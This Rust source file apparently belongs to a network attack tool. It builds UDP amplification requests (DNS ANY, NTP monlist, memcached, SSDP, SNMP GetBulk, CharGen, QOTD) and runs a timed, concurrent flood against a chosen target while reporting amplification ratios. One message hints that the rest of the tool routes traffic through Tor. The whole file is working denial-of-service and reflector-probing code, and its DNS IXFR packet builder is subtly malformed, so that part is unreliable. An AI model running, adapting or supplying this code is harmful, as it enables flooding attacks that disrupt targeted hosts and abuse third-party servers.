use std::time::{Duration, Instant};
use tokio::net::UdpSocket;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UdpMode {
    DnsAny,
    DnsIxfr,
    NtpMonlist,
    NtpQuery,
    MemcachedStats,
    MemcachedGet,
    SsdpDiscovery,
    SnmpGetBulk,
    CharGen,
    Qotd,
    GenericUdp,
}

impl UdpMode {
    pub fn name(&self) -> &'static str {
        match self {
            UdpMode::DnsAny => "DNS ANY reflection",
            UdpMode::DnsIxfr => "DNS IXFR zone transfer",
            UdpMode::NtpMonlist => "NTP monlist amplification",
            UdpMode::NtpQuery => "NTP time query amplification",
            UdpMode::MemcachedStats => "Memcached stats amplification",
            UdpMode::MemcachedGet => "Memcached get amplification",
            UdpMode::SsdpDiscovery => "SSDP discovery amplification",
            UdpMode::SnmpGetBulk => "SNMP getbulk amplification",
            UdpMode::CharGen => "CharGen amplification",
            UdpMode::Qotd => "QOTD amplification",
            UdpMode::GenericUdp => "UDP datagram flood",
        }
    }

    pub fn default_port(&self) -> u16 {
        match self {
            UdpMode::DnsAny | UdpMode::DnsIxfr => 53,
            UdpMode::NtpMonlist | UdpMode::NtpQuery => 123,
            UdpMode::MemcachedStats | UdpMode::MemcachedGet => 11211,
            UdpMode::SsdpDiscovery => 1900,
            UdpMode::SnmpGetBulk => 161,
            UdpMode::CharGen => 19,
            UdpMode::Qotd => 17,
            UdpMode::GenericUdp => 12345,
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "dns-any" => Some(UdpMode::DnsAny),
            "dns-ixfr" => Some(UdpMode::DnsIxfr),
            "ntp-monlist" => Some(UdpMode::NtpMonlist),
            "ntp-query" => Some(UdpMode::NtpQuery),
            "memcached-stats" => Some(UdpMode::MemcachedStats),
            "memcached-get" => Some(UdpMode::MemcachedGet),
            "ssdp" => Some(UdpMode::SsdpDiscovery),
            "snmp" => Some(UdpMode::SnmpGetBulk),
            "chargen" => Some(UdpMode::CharGen),
            "qotd" => Some(UdpMode::Qotd),
            "udp-generic" | "generic" => Some(UdpMode::GenericUdp),
            _ => None,
        }
    }
}

// ================================================================
// DNS ANY query — request is ~40B, response can be 3-4KB
// Amplification: up to 70x
// ================================================================
fn build_dns_query(qtype: u16, domain: &str) -> Vec<u8> {
    let tid: u16 = rand::random();
    let mut pkt = Vec::with_capacity(512);

    // Header (12 bytes)
    pkt.extend_from_slice(&tid.to_be_bytes());  // Transaction ID
    pkt.extend_from_slice(&[0x01, 0x00]);        // Flags: standard query, RD=1
    pkt.extend_from_slice(&[0x00, 0x01]);        // QDCOUNT: 1 question
    pkt.extend_from_slice(&[0x00, 0x00]);        // ANCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00]);        // NSCOUNT: 0
    pkt.extend_from_slice(&[0x00, 0x00]);        // ARCOUNT: 0

    // Encode domain as DNS labels
    for label in domain.split('.') {
        if label.is_empty() { continue; }
        pkt.push(label.len() as u8);
        pkt.extend_from_slice(label.as_bytes());
    }
    pkt.push(0x00);  // Root terminator
    pkt.extend_from_slice(&qtype.to_be_bytes());  // QTYPE
    pkt.extend_from_slice(&[0x00, 0x01]);         // QCLASS (IN)

    pkt
}

fn build_dns_any() -> Vec<u8> {
    build_dns_query(0x00ff, "google.com")  // QTYPE = ANY, target google.com
}

fn build_dns_ixfr() -> Vec<u8> {
    // IXFR uses a SOA serial number to request incremental zone transfer
    // For amplification, we send IXFR with serial=0 which asks for full zone
    let mut pkt = build_dns_query(0x00fb, "google.com");  // QTYPE = IXFR, target google.com

    // IXFR requires an authority section with the SOA record
    // Add SOA in authority section
    pkt.extend_from_slice(&[0x00, 0x01]);  // NSCOUNT: 1 (authority RR)

    // Authority RR: root label
    pkt.push(0x00);   // Name: .
    pkt.extend_from_slice(&[0x00, 0x06]);  // TYPE: SOA
    pkt.extend_from_slice(&[0x00, 0x01]);  // CLASS: IN
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);  // TTL
    pkt.extend_from_slice(&[0x00, 0x14]);  // RDLENGTH: 20
    // SOA RDATA: MNAME, RNAME, SERIAL=0, REFRESH, RETRY, EXPIRE, MINIMUM
    pkt.extend_from_slice(&[0x00; 20]);     // Zero SOA fields

    // Fix ARCOUNT to 0
    pkt[10] = 0x00;
    pkt[11] = 0x00;

    pkt
}

// ================================================================
// NTP monlist — sends GET_MONLIST request to NTP server
// Classic amplification: up to 556x
// ================================================================
fn build_ntp_monlist() -> Vec<u8> {
    // NTP mode 7 (MODE_PRIVATE) message for GET_MONLIST (op 0)
    let mut pkt = vec![0u8; 12];

    pkt[0] = 0x17;           // Leap=0, Version=2, Mode=7 (private)
    pkt[1] = 0x03;           // Implementation=3 (ntpd), Request code=0 (GET_MONLIST)
    pkt[2] = 0x00;           // Sequence number (0 for first request)
    pkt[3] = 0x00;           // Status, Err, Message count
    // Association ID (4 bytes) — use 0 for first
    // Timestamp (4 bytes) — use 0
    // The response is a series of monlist entries

    pkt
}

fn build_ntp_query() -> Vec<u8> {
    // NTP v3 client request — mode 3 (client)
    let mut pkt = vec![0u8; 48];

    pkt[0] = 0x1b;           // Leap=0, Version=3, Mode=3 (client)
    // Originate timestamp (bytes 24-31) — set to current time in NTP format
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let ntp_secs = epoch.as_secs() + 2208988800u64;  // Offset to NTP epoch
    let ntp_frac = ((epoch.subsec_nanos() as u64) << 32) / 1_000_000_000;

    pkt[24..28].copy_from_slice(&(ntp_secs as u32).to_be_bytes());  // Seconds (u32)
    pkt[28..32].copy_from_slice(&(ntp_frac as u32).to_be_bytes());  // Fraction (u32)

    pkt
}

// ================================================================
// Memcached — text protocol, "stats" returns a lot of data
// Amplification: up to 51,000x (10MB+ response from 15B request)
// ================================================================
fn build_memcached_stats() -> Vec<u8> {
    b"stats\r\n".to_vec()
}

fn build_memcached_get() -> Vec<u8> {
    // Some memcached servers have cached keys — ask for a known one
    // "stats cachedump 1 100" can dump many keys (amplification vector)
    b"stats cachedump 1 100\r\n".to_vec()
}

// ================================================================
// SSDP (Simple Service Discovery Protocol) — M-SEARCH request
// Used by UPnP devices, response can be quite large
// ================================================================
fn build_ssdp_discovery() -> Vec<u8> {
    b"M-SEARCH * HTTP/1.1\r\n\
      HOST: 239.255.255.250:1900\r\n\
      MAN: \"ssdp:discover\"\r\n\
      MX: 3\r\n\
      ST: ssdp:all\r\n\
      \r\n"
    .to_vec()
}

// ================================================================
// SNMP GetBulk — ASN.1/BER encoded GetBulkRequest
// Forcibly retrieve many OIDs in one request
// ================================================================
fn build_snmp_getbulk() -> Vec<u8> {
    // SNMPv2c GetBulkRequest for .1.3.6.1.2.1 (mib-2)
    // max-repetitions = 50 means we ask for 50 OIDs at once
    let community = b"public";
    let req_id: u32 = rand::random();

    // SNMP message wrapper
    let mut pkt = Vec::new();

    // SEQUENCE { version, community, data }
    // version = SNMPv2c (1)
    // community = "public"
    // data = GetBulkRequest {
    //     request-id, non-repeaters=0, max-repetitions=50,
    //     variable-bindings [ .1.3.6.1.2.1.1 (system) ]
    // }

    // We'll construct this manually in BER:
    // 0x30 (SEQUENCE) length ...
    //   0x02 (INTEGER) 1 0x01 (version=1)
    //   0x04 (OCTET STRING) 6 "public"
    //   0xa5 (GetBulkRequest [5]) length ...
    //     0x02 (INTEGER) 4 req_id
    //     0x02 (INTEGER) 1 0x00 (non-repeaters)
    //     0x02 (INTEGER) 1 50   (max-repetitions)
    //     0x30 (SEQUENCE) length ...
    //       0x30 (SEQUENCE) length ...
    //         0x06 (OID) ... .1.3.6.1.2.1.1
    //         0x05 (NULL) (empty value)

    // Build from inner to outer:
    // Variable binding: (.1.3.6.1.2.1.1, NULL)
    let oid_bytes: &[u8] = &[0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x00];
    let mut vb_value = Vec::new();
    vb_value.push(0x06);
    vb_value.push(oid_bytes.len() as u8);
    vb_value.extend_from_slice(oid_bytes);
    vb_value.extend_from_slice(&[0x05, 0x00]); // NULL value

    let vb_seq = build_sequence(&vb_value);

    // variable-bindings SEQUENCE
    let vbs = build_sequence(&vb_seq);

    // GetBulkRequest PDU: 0xa5 | length | request-id | non-repeaters | max-repetitions | vbs
    let mut pdu_body = Vec::new();
    pdu_body.extend_from_slice(&encode_integer(req_id as i64));
    pdu_body.extend_from_slice(&encode_integer(0));   // non-repeaters
    pdu_body.extend_from_slice(&encode_integer(50));  // max-repetitions
    pdu_body.extend_from_slice(&vbs);

    // PDU tag 0xa5 = context [5] (GetBulkRequest)
    let pdu = build_tagged(0xa5, &pdu_body);

    // community string
    let comm = build_octet_string(community);

    // version (INTEGER 1 = SNMPv2c)
    let version = encode_integer(1);

    // SNMP message SEQUENCE
    let mut msg_body = Vec::new();
    msg_body.extend_from_slice(&version);
    msg_body.extend_from_slice(&comm);
    msg_body.extend_from_slice(&pdu);

    pkt = build_sequence(&msg_body);

    pkt
}

fn build_sequence(contents: &[u8]) -> Vec<u8> {
    let mut out = vec![0x30];
    encode_length(&mut out, contents.len());
    out.extend_from_slice(contents);
    out
}

fn build_tagged(tag: u8, contents: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    encode_length(&mut out, contents.len());
    out.extend_from_slice(contents);
    out
}

fn encode_integer(value: i64) -> Vec<u8> {
    if value == 0 {
        return vec![0x02, 0x01, 0x00];
    }

    let mut val = value;
    let mut bytes = Vec::new();
    let negative = val < 0;
    if negative { val = -val; }

    while val > 0 {
        bytes.push((val & 0xff) as u8);
        val >>= 8;
    }
    bytes.reverse();

    // Add leading 0xff if negative and MSB set
    if negative {
        // Two's complement
        for b in &mut bytes {
            *b = !*b;
        }
        // Add 1
        for b in bytes.iter_mut().rev() {
            let (v, carry) = b.overflowing_add(1);
            *b = v;
            if !carry { break; }
        }
        if bytes[0] & 0x80 == 0 {
            bytes.insert(0, 0xff);
        }
    } else if bytes[0] & 0x80 != 0 {
        bytes.insert(0, 0x00);
    }

    let mut out = vec![0x02];
    encode_length(&mut out, bytes.len());
    out.extend_from_slice(&bytes);
    out
}

fn encode_length(out: &mut Vec<u8>, len: usize) {
    if len < 128 {
        out.push(len as u8);
    } else {
        let mut bytes = Vec::new();
        let mut l = len;
        while l > 0 {
            bytes.push((l & 0xff) as u8);
            l >>= 8;
        }
        bytes.reverse();
        out.push(0x80 | bytes.len() as u8);
        out.extend_from_slice(&bytes);
    }
}

fn encode_octet_string(contents: &[u8]) -> Vec<u8> {
    let mut out = vec![0x04];
    encode_length(&mut out, contents.len());
    out.extend_from_slice(contents);
    out
}

fn build_octet_string(contents: &[u8]) -> Vec<u8> {
    encode_octet_string(contents)
}

// ================================================================
// CharGen (Character Generator Protocol) — port 19
// Send any byte, get up to 512 bytes of random characters back
// ================================================================
fn build_chargen() -> Vec<u8> {
    // Just send a newline — server responds with character stream
    vec![b'\n']
}

// ================================================================
// QOTD (Quote of the Day) — port 17
// Send any byte, get a quote back
// ================================================================
fn build_qotd() -> Vec<u8> {
    vec![b'\n']
}

// ================================================================
// Run a single UDP amplification exchange
// ================================================================
async fn run_udp_protocol(mode: UdpMode, host: &str, port: u16) -> Result<(usize, usize), String> {
    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("bind: {}", e))?;

    // Set read timeout
    let target_addr = format!("{}:{}", host, port);

    // Build request
    let request = match mode {
        UdpMode::DnsAny => build_dns_any(),
        UdpMode::DnsIxfr => build_dns_ixfr(),
        UdpMode::NtpMonlist => build_ntp_monlist(),
        UdpMode::NtpQuery => build_ntp_query(),
        UdpMode::MemcachedStats => build_memcached_stats(),
        UdpMode::MemcachedGet => build_memcached_get(),
        UdpMode::SsdpDiscovery => {
            // SSDP is multicast — connect first
            let sent = socket.send_to(&build_ssdp_discovery(), &target_addr)
                .await
                .map_err(|e| format!("send: {}", e))?;
            let mut buf = vec![0u8; 65535];
            let recv = tokio::time::timeout(Duration::from_secs(3), socket.recv_from(&mut buf))
                .await
                .map_err(|_| "timeout".to_string())?
                .map_err(|e| format!("recv: {}", e))?
                .0;
            return Ok((sent, recv));
        }
        UdpMode::SnmpGetBulk => build_snmp_getbulk(),
        UdpMode::CharGen => build_chargen(),
        UdpMode::Qotd => build_qotd(),
        UdpMode::GenericUdp => {
            // Send a small datagram, read what comes back
            let sent = socket.send_to(b"hello", &target_addr)
                .await
                .map_err(|e| format!("send: {}", e))?;
            let mut buf = vec![0u8; 65535];
            let recv = tokio::time::timeout(Duration::from_secs(3), socket.recv_from(&mut buf))
                .await
                .map_err(|_| "timeout".to_string())?
                .map_err(|e| format!("recv: {}", e))?
                .0;
            return Ok((sent, recv));
        }
    };

    let sent = request.len();

    // Send the request
    socket.send_to(&request, &target_addr)
        .await
        .map_err(|e| format!("send: {}", e))?;

    // Read response with timeout
    let mut buf = vec![0u8; 65535];
    let recv = match tokio::time::timeout(Duration::from_secs(5), socket.recv_from(&mut buf)).await {
        Ok(Ok((n, _))) => n,
        Ok(Err(e)) => return Err(format!("recv: {}", e)),
        Err(_) => return Err("timeout".to_string()),
    };

    Ok((sent, recv))
}

/// Run UDP load: spawns workers that repeatedly send and receive
pub async fn run_udp_load(
    mode: UdpMode,
    target: &str,
    concurrency: usize,
    duration_secs: u64,
) {
    let start = Instant::now();
    let dur = Duration::from_secs(duration_secs);
    let port = mode.default_port();
    let host = target.split(':').next().unwrap_or(target);
    let custom_port = target.split(':').nth(1).and_then(|p| p.parse::<u16>().ok());
    let port = custom_port.unwrap_or(port);

    println!("=== UDP Amplification: {} ===", mode.name());
    println!("Target: {}:{} | Concurrency: {} | Duration: {}s", host, port, concurrency, duration_secs);
    println!("Note: Tor does not route UDP. Running in direct mode.");
    println!();

    let mut total_sent: u64 = 0;
    let mut total_recv: u64 = 0;
    let mut total_requests: u64 = 0;
    let mut total_errors: u64 = 0;

    while start.elapsed() < dur {
        let mut handles = Vec::new();

        for _ in 0..concurrency {
            let host = host.to_string();
            let mode = mode;

            handles.push(tokio::spawn(async move {
                match run_udp_protocol(mode, &host, port).await {
                    Ok((sent, recv)) => (sent as u64, recv as u64, false),
                    Err(_) => (0u64, 0u64, true),
                }
            }));
        }

        for h in handles {
            match h.await {
                Ok((sent, recv, is_err)) => {
                    total_sent += sent;
                    total_recv += recv;
                    total_requests += 1;
                    if is_err { total_errors += 1; }
                }
                Err(_) => {
                    total_errors += 1;
                    total_requests += 1;
                }
            }
        }

        let elapsed = start.elapsed().as_secs();

        // Status update
        if elapsed % 5 == 0 || total_requests < 10 {
            let amp_ratio = if total_sent > 0 {
                total_recv as f64 / total_sent as f64
            } else {
                0.0
            };
            println!(
                "[{:3}s] Req: {:5} | Err: {:3} | Sent: {}KB | Recv: {}KB | Ratio: {:.1}x | Rate: {:.0} req/s",
                elapsed,
                total_requests,
                total_errors,
                total_sent / 1024,
                total_recv / 1024,
                amp_ratio,
                total_requests as f64 / elapsed.max(1) as f64,
            );
        }
    }

    let elapsed = start.elapsed().as_secs().max(1);
    let amp_ratio = if total_sent > 0 {
        total_recv as f64 / total_sent as f64
    } else {
        0.0
    };
    println!();
    println!("=== Results ===");
    println!("Total requests: {}", total_requests);
    println!("Total errors:   {}", total_errors);
    println!("Sent:           {} bytes ({} KB)", total_sent, total_sent / 1024);
    println!("Received:       {} bytes ({} KB)", total_recv, total_recv / 1024);
    println!("Amplification:  {:.1}x", amp_ratio);
    println!("Rate:           {:.0} req/s", total_requests as f64 / elapsed as f64);
}
